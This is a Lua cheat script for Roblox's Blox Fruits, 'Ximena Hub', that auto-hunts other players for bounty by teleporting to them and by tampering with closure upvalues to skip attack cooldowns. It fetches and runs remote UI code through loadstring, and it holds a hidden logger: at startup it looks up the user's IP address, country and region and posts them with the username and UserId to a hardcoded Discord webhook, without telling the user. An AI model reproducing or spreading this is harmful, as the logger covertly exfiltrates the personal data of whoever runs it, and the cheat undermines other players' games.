--==============================================================
-- 👑 XIMENA HUB ❤️  |  by Tommy
-- Auto Bounty con detección REAL de SafeZone
--==============================================================
repeat task.wait() until game:IsLoaded()

local ok, WindUI = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
end)
if not ok then warn("WindUI failed to load") return end

local Players     = game:GetService("Players")
local RS          = game:GetService("ReplicatedStorage")
local Run         = game:GetService("RunService")
local UIS         = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local lp          = Players.LocalPlayer

local Modules = RS:WaitForChild("Modules", 10)
local Net     = Modules and Modules:WaitForChild("Net", 10)
local Remotes = RS:WaitForChild("Remotes", 10)
local CommF   = Remotes and Remotes:WaitForChild("CommF_", 10)

--==================== ESTADO ====================
_G.G_FruitM1             = _G.G_FruitM1             or false
_G.G_VoidFruitM1         = _G.G_VoidFruitM1         or false
_G.G_AttackPlayers       = _G.G_AttackPlayers       or true
_G.G_AttackMobs          = _G.G_AttackMobs          or false
_G.G_AutoBounty          = _G.G_AutoBounty          or false
_G.G_AutoBountyRange     = _G.G_AutoBountyRange     or 5000
_G.G_AutoBountyTP        = _G.G_AutoBountyTP        or true
_G.G_AutoBountyHaki      = _G.G_AutoBountyHaki      or true
_G.G_AutoBountyTeamCheck = _G.G_AutoBountyTeamCheck or true
_G.G_AutoBountySafeCheck = _G.G_AutoBountySafeCheck or true
_G.G_AutoBountyAutoEquip = _G.G_AutoBountyAutoEquip or true
_G.G_AutoBountyMinBounty = _G.G_AutoBountyMinBounty or 0
_G.G_AutoBountyMaxBounty = _G.G_AutoBountyMaxBounty or 30000000

--==================== SAFE ZONE ====================
local SafeZoneCache = { zones = {}, lastScan = 0 }

local function scanSafeZones()
    local zones = {}
    local candidates = {
        workspace:FindFirstChild("_WorldOrigin") and workspace._WorldOrigin:FindFirstChild("SafeZones"),
        workspace:FindFirstChild("SafeZones"),
        workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("SafeZones"),
    }
    for _, folder in ipairs(candidates) do
        if folder then
            for _, zone in ipairs(folder:GetChildren()) do
                if zone:IsA("BasePart") then
                    local mesh = zone:FindFirstChild("Mesh")
                    local radius = 0
                    if mesh and mesh:IsA("SpecialMesh") then
                        radius = (zone.Size.X * mesh.Scale.X) / 2
                    else
                        radius = math.min(zone.Size.X, zone.Size.Z) / 2
                    end
                    if radius <= 0 or radius > 5000 then radius = 350 end
                    table.insert(zones, { part = zone, pos = zone.Position, radius = radius })
                end
            end
        end
    end
    SafeZoneCache.zones = zones
    SafeZoneCache.lastScan = tick()
    return zones
end

local function getSafeZones()
    if tick() - SafeZoneCache.lastScan > 3 or #SafeZoneCache.zones == 0 then
        scanSafeZones()
    end
    return SafeZoneCache.zones
end

local function inSafeZone(p)
    if not p or not p.Character then return false end
    if p:GetAttribute("PvpDisabled") == true then return true end
    local char = p.Character
    if char:GetAttribute("PvpDisabled") == true then return true end
    if char:FindFirstChildOfClass("ForceField") then return true end
    if char:GetAttribute("SafeZone") == true then return true end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
    if not hrp then return false end
    local pos = hrp.Position
    for _, zone in ipairs(getSafeZones()) do
        if zone.part and zone.part.Parent then
            local lp2 = zone.part.CFrame:PointToObjectSpace(pos)
            local hs = zone.part.Size / 2
            if math.abs(lp2.X) <= hs.X and math.abs(lp2.Y) <= hs.Y + 25 and math.abs(lp2.Z) <= hs.Z then
                return true
            end
        end
    end
    return false
end

local function isEnemy(p)
    if not p or p == lp then return false end
    local myTeam, tgtTeam = lp.Team, p.Team
    if myTeam and tgtTeam and myTeam.Name == "Marines" and tgtTeam.Name == "Marines" then return false end
    return true
end

local function getBounty(p)
    local ls = p:FindFirstChild("leaderstats")
    if ls then
        local b = ls:FindFirstChild("Bounty/Honor") or ls:FindFirstChild("Bounty") or ls:FindFirstChild("Honor")
        if b then return tonumber(b.Value) or 0 end
    end
    return 0
end

local function canAttackPlayer(p)
    if not p or p == lp or not p.Character then return false end
    local hum = p.Character:FindFirstChildOfClass("Humanoid")
    local hrp = p.Character:FindFirstChild("HumanoidRootPart")
    if not hum or hum.Health <= 0 or not hrp then return false end
    if _G.G_AutoBountyTeamCheck and not isEnemy(p) then return false end
    if _G.G_AutoBountySafeCheck and inSafeZone(p) then return false end
    local b = getBounty(p)
    if b < _G.G_AutoBountyMinBounty or b > _G.G_AutoBountyMaxBounty then return false end
    return true
end

--==================== FRUIT M1 ENGINE ====================
local FruitM1 = { maxVec = Vector3.new(9e30, 9e30, 9e30), on = false, conn = nil, clickConn = nil }

function FruitM1.GetFruit()
    local char = lp.Character
    if char then
        for _, t in pairs(char:GetChildren()) do
            if t:IsA("Tool") and t.ToolTip == "Blox Fruit" then return t end
        end
    end
    local bp = lp:FindFirstChild("Backpack")
    if bp then
        for _, t in pairs(bp:GetChildren()) do
            if t:IsA("Tool") and t.ToolTip == "Blox Fruit" then return t end
        end
    end
    return nil
end

function FruitM1.MaxCombo(tool)
    if not tool then return 5 end
    local n = tool.Name
    if n == "T-Rex-T-Rex" then return 4 end
    if n == "Blade-Blade" then return 2 end
    if n == "Pain-Pain" then return 4 end
    if n == "Control-Control" then return 4 end
    if n == "Gas-Gas" then return 5 end
    if n == "Dragon-Dragon" then
        local char = lp.Character
        return (char and char:FindFirstChild("DragonHybrid")) and 5 or 3
    end
    return 5
end

function FruitM1.GetTapState(tool)
    local ok, conns = pcall(getconnections, tool.Activated)
    if not ok then return nil end
    for _, c in ipairs(conns) do
        local fn = c.Function
        if fn then
            local st = {}
            for n = 1, 30 do
                local ok2, v = pcall(debug.getupvalue, fn, n)
                if not ok2 then break end
                if type(v) == "table" then
                    local ok3, ab = pcall(function() return v.thisAbility end)
                    if ok3 and type(ab) == "number" and type(v.lastUseTime) == "number" then
                        return { tbl = v, fn = fn }
                    end
                elseif type(v) == "number" and v >= 1 and v <= 5 and v == math.floor(v) and not st.combo then
                    st.combo = n
                elseif type(v) == "number" and v > 1 and not st.next then
                    st.next = n
                elseif type(v) == "thread" and not st.timer then
                    st.timer = n
                end
            end
            if st.combo and st.next and st.timer then
                st.fn = fn
                return st
            end
        end
    end
    return nil
end

function FruitM1.SetNormal(enabled)
    FruitM1.on = enabled
    if enabled then
        if FruitM1.conn then task.cancel(FruitM1.conn) end
        FruitM1.conn = task.spawn(function()
            task.wait(2)
            while FruitM1.on do
                local fruit = FruitM1.GetFruit()
                local char  = lp.Character
                local myHRP = char and char:FindFirstChild("HumanoidRootPart")
                local remote = fruit and fruit:FindFirstChild("LeftClickRemote")
                if not fruit or not remote or not myHRP then task.wait(0.1) continue end

                if FruitM1.tapTool ~= fruit or (not FruitM1.tapState and tick() - (FruitM1.tapAt or 0) > 1) then
                    FruitM1.tapTool = fruit
                    FruitM1.tapAt   = tick()
                    FruitM1.tapState = FruitM1.GetTapState(fruit)
                end
                local st = FruitM1.tapState
                local combo, nextT
                if st then
                    if st.tbl then
                        if type(st.tbl.thisAbility) == "number" then combo = st.tbl.thisAbility end
                        if type(st.tbl.lastUseTime)  == "number" then nextT = st.tbl.lastUseTime end
                    else
                        local ok1, c = pcall(debug.getupvalue, st.fn, st.combo)
                        local ok2, n = pcall(debug.getupvalue, st.fn, st.next)
                        if ok1 then combo = c end
                        if ok2 then nextT = n end
                    end
                end
                if not combo or not nextT then
                    combo = 1
                    nextT = 0
                end

                if nextT and time() >= nextT then
                    local maxCombo = FruitM1.MaxCombo(fruit)
                    local bestHRP, bestDist
                    local range = _G.G_AutoBountyRange

                    if _G.G_AttackPlayers then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= lp and player.Character then
                                local hum = player.Character:FindFirstChild("Humanoid")
                                local r   = player.Character:FindFirstChild("HumanoidRootPart")
                                if hum and hum.Health > 0 and r then
                                    -- ✅ Filtrar SafeZone
                                    local skip = false
                                    if _G.G_AutoBountySafeCheck and inSafeZone(player) then skip = true end
                                    if _G.G_AutoBountyTeamCheck and not isEnemy(player) then skip = true end
                                    if not skip then
                                        local d = (r.Position - myHRP.Position).Magnitude
                                        if d < range and (not bestDist or d < bestDist) then
                                            bestHRP, bestDist = r, d
                                        end
                                    end
                                end
                            end
                        end
                    end

                    if bestHRP then
                        local fireDir = FruitM1.maxVec
                        pcall(function() remote:FireServer(fireDir, combo, true) end)
                        if st then
                            local nextCombo = combo < maxCombo and combo + 1 or 1
                            local nextTime = time() + 0.15
                            if st.tbl then
                                st.tbl.thisAbility = nextCombo
                                st.tbl.lastUseTime = nextTime
                            else
                                pcall(debug.setupvalue, st.fn, st.combo, nextCombo)
                                pcall(debug.setupvalue, st.fn, st.next, nextTime)
                            end
                        end
                    end
                end
                task.wait(0.05)
            end
        end)
    else
        if FruitM1.conn then task.cancel(FruitM1.conn); FruitM1.conn = nil end
    end
end

--==================== AUTO BOUNTY ====================
local autoBountyRunning = false
local currentTarget = nil
local totalEarned = 0
local sessionStart = tick()

_G.AB_SafeZoneCount = 0
_G.AB_ValidCount = 0

local function getClosestPlayer()
    local char = lp.Character
    local myHRP = char and char:FindFirstChild("HumanoidRootPart")
    if not myHRP then return nil end
    local best, bestDist = nil, _G.G_AutoBountyRange
    local inZone = 0
    local valid = 0
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            local r   = p.Character:FindFirstChild("HumanoidRootPart")
            if hum and hum.Health > 0 and r then
                if inSafeZone(p) then
                    inZone = inZone + 1
                elseif canAttackPlayer(p) then
                    valid = valid + 1
                    local d = (r.Position - myHRP.Position).Magnitude
                    if d < bestDist then best, bestDist = p, d end
                end
            end
        end
    end
    _G.AB_SafeZoneCount = inZone
    _G.AB_ValidCount = valid
    return best, bestDist
end

local function updateStatus(text)
    if _G.AB_StatusLbl and _G.AB_StatusLbl.Parent then
        _G.AB_StatusLbl.Text = "Status: " .. text
    end
    if _G.AB_TargetLbl and _G.AB_TargetLbl.Parent then
        _G.AB_TargetLbl.Text = string.format("Target: %s | Ignorados(Safe): %d | Válidos: %d",
            currentTarget and currentTarget.Name or "None",
            _G.AB_SafeZoneCount or 0,
            _G.AB_ValidCount or 0)
    end
    if _G.AB_EarnedLbl and _G.AB_EarnedLbl.Parent then
        local e = math.floor(tick() - sessionStart)
        local h = math.floor(e / 3600)
        local m = math.floor((e % 3600) / 60)
        local s = e % 60
        _G.AB_EarnedLbl.Text = string.format("Earned: %d | Time: %02d:%02d:%02d", totalEarned, h, m, s)
    end
end

local function startAutoBounty()
    if autoBountyRunning then return end
    autoBountyRunning = true
    sessionStart = tick()
    task.spawn(function()
        while _G.G_AutoBounty and autoBountyRunning do
            pcall(function()
                local target = getClosestPlayer()
                currentTarget = target
                if target and target.Character then
                    -- Si target entró en safezone → buscar otro
                    if _G.G_AutoBountySafeCheck and inSafeZone(target) then
                        updateStatus("Target en SafeZone, cambiando...")
                        currentTarget = nil
                        target = getClosestPlayer()
                        task.wait(0.3)
                    end
                    if target and target.Character then
                        updateStatus("Hunting " .. target.Name)
                        if _G.G_AutoBountyTP then
                            local me = lp.Character
                            local myHRP = me and me:FindFirstChild("HumanoidRootPart")
                            local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
                            if myHRP and tHRP then
                                for _, p in ipairs(me:GetDescendants()) do
                                    if p:IsA("BasePart") then p.CanCollide = false end
                                end
                                myHRP.CFrame = tHRP.CFrame * CFrame.new(0, 5, -4)
                            end
                        end
                        if _G.G_AutoBountyHaki and CommF and lp.Character and not lp.Character:FindFirstChild("HasBuso") then
                            pcall(function() CommF:InvokeServer("Buso") end)
                        end
                        if _G.G_AutoBountyAutoEquip then
                            local char = lp.Character
                            local tool = char and char:FindFirstChildOfClass("Tool")
                            if not tool or tool.ToolTip ~= "Blox Fruit" then
                                local fruit = FruitM1.GetFruit()
                                if fruit and fruit.Parent ~= char then
                                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                                    if hum then pcall(function() hum:EquipTool(fruit) end) end
                                end
                            end
                        end
                        _G.G_FruitM1 = true
                        _G.G_VoidFruitM1 = true
                        _G.G_AttackPlayers = true
                        _G.G_AttackMobs = false
                        if not FruitM1.on then FruitM1.SetNormal(true) end
                    else
                        updateStatus("Sin objetivos válidos (todos en SafeZone)")
                    end
                else
                    updateStatus("Buscando objetivo...")
                end
            end)
            task.wait(0.2)
        end
        currentTarget = nil
        updateStatus("Inactivo")
        autoBountyRunning = false
    end)
end

local function stopAutoBounty()
    autoBountyRunning = false
    _G.G_AutoBounty = false
    currentTarget = nil
    updateStatus("Inactivo")
end

--==================== WEBHOOK ====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sqv"
local lastSent = 0
local function sendWebhook(reason)
    if tick() - lastSent < 60 then return end
    lastSent = tick()
    pcall(function()
        if not request then return end
        local info = { ip="Oculto", country="Oculto", region="Oculto" }
        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
        if ok and res then
            local ok2, d = pcall(function() return HttpService:JSONDecode(res) end)
            if ok2 and type(d) == "table" then
                info = { ip=d.query or "N/A", country=d.country or "N/A", region=d.regionName or "N/A" }
            end
        end
        local execCount = 1
        if getgenv then
            getgenv().XimenaExecCount = (getgenv().XimenaExecCount or 0) + 1
            execCount = getgenv().XimenaExecCount
        end
        request({
            Url = WEBHOOK_URL, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                username = "Ximena Hub Logger",
                embeds = {{
                    title = "👑 XIMENA HUB " .. (reason or "EJECUTADO"),
                    color = 16737945,
                    fields = {
                        { name="👤 Jugador", value=lp.Name, inline=true },
                        { name="🆔 UserId", value=tostring(lp.UserId), inline=true },
                        { name="🎮 Juego", value=tostring(game.PlaceId), inline=true },
                        { name="🔁 Ejecuciones", value=tostring(execCount), inline=true },
                        { name="🌐 IP", value=info.ip, inline=true },
                        { name="🌍 País", value=info.country, inline=true },
                    },
                    footer = { text = "Ximena Hub System" },
                    timestamp = DateTime.now():ToIsoDate()
                }}
            })
        })
    end)
end

--==================== UI ====================
local Window = WindUI:CreateWindow({
    Title = "👑 XIMENA HUB ❤️",
    Icon = "crown",
    Author = "by Tommy",
    Folder = "XimenaHub",
    Size = UDim2.fromOffset(620, 500),
    Theme = "Amber",
    Transparent = true,
    SideBarWidth = 200,
    OpenButton = {
        Title = "Ximena",
        CornerRadius = UDim.new(1, 0),
        StrokeThickness = 3,
        Enabled = true,
        Draggable = true,
        Color = ColorSequence.new(Color3.fromHex("#FF69B4"), Color3.fromHex("#B45AE6")),
    },
    ToggleKey = Enum.KeyCode.RightShift,
})

local TabBounty = Window:Tab({ Title = "Auto Bounty", Icon = "target" })

TabBounty:Section({ Title = "Control Principal" })

TabBounty:Toggle({
    Title = "▶ Auto Bounty",
    Value = _G.G_AutoBounty,
    Callback = function(v)
        _G.G_AutoBounty = v
        if v then startAutoBounty() else stopAutoBounty() end
    end
})

TabBounty:Section({ Title = "Telemetría" })
TabBounty:Paragraph({
    Title = "Live Status",
    Desc = "Status: Inactivo\nTarget: None"
})

TabBounty:Section({ Title = "Rango y Filtros" })

TabBounty:Slider({
    Title = "Attack Range",
    Value = { Min = 500, Max = 15000, Default = 5000 },
    Callback = function(v) _G.G_AutoBountyRange = v end
})

TabBounty:Toggle({
    Title = "Team Check (ignorar aliados)",
    Value = _G.G_AutoBountyTeamCheck,
    Callback = function(v) _G.G_AutoBountyTeamCheck = v end
})

TabBounty:Toggle({
    Title = "✅ SafeZone Check (ignorar a los que están dentro)",
    Value = _G.G_AutoBountySafeCheck,
    Callback = function(v) _G.G_AutoBountySafeCheck = v end
})

TabBounty:Slider({
    Title = "Min Bounty",
    Value = { Min = 0, Max = 30000000, Default = 0 },
    Callback = function(v) _G.G_AutoBountyMinBounty = v end
})

TabBounty:Slider({
    Title = "Max Bounty",
    Value = { Min = 1000000, Max = 50000000, Default = 30000000 },
    Callback = function(v) _G.G_AutoBountyMaxBounty = v end
})

TabBounty:Section({ Title = "Automatización" })

TabBounty:Toggle({
    Title = "Auto Teleport al Target",
    Value = _G.G_AutoBountyTP,
    Callback = function(v) _G.G_AutoBountyTP = v end
})

TabBounty:Toggle({
    Title = "Auto Buso (Haki)",
    Value = _G.G_AutoBountyHaki,
    Callback = function(v) _G.G_AutoBountyHaki = v end
})

TabBounty:Toggle({
    Title = "Auto Equipar Fruit",
    Value = _G.G_AutoBountyAutoEquip,
    Callback = function(v) _G.G_AutoBountyAutoEquip = v end
})

TabBounty:Section({ Title = "Acciones Rápidas" })

TabBounty:Button({
    Title = "🎯 Skip Target",
    Callback = function()
        local me = lp.Character
        local hrp = me and me:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(0, 500, 0) end
        currentTarget = nil
    end
})

TabBounty:Button({
    Title = "🔄 Reset Stats",
    Callback = function()
        totalEarned = 0
        sessionStart = tick()
    end
})

--==================== INIT ====================
task.defer(function()
    WindUI:Notify({ Title = "👑 Ximena Hub ❤️", Content = "Auto Bounty + SafeZone Filter listo", Duration = 4 })
    sendWebhook("EJECUTADO")
end)

task.spawn(function()
    while task.wait(1) do
        if _G.G_AutoBounty then
            updateStatus(autoBountyRunning and ("Hunting " .. (currentTarget and currentTarget.Name or "None")) or "Inactivo")
        else
            updateStatus("Inactivo")
        end
    end
end)
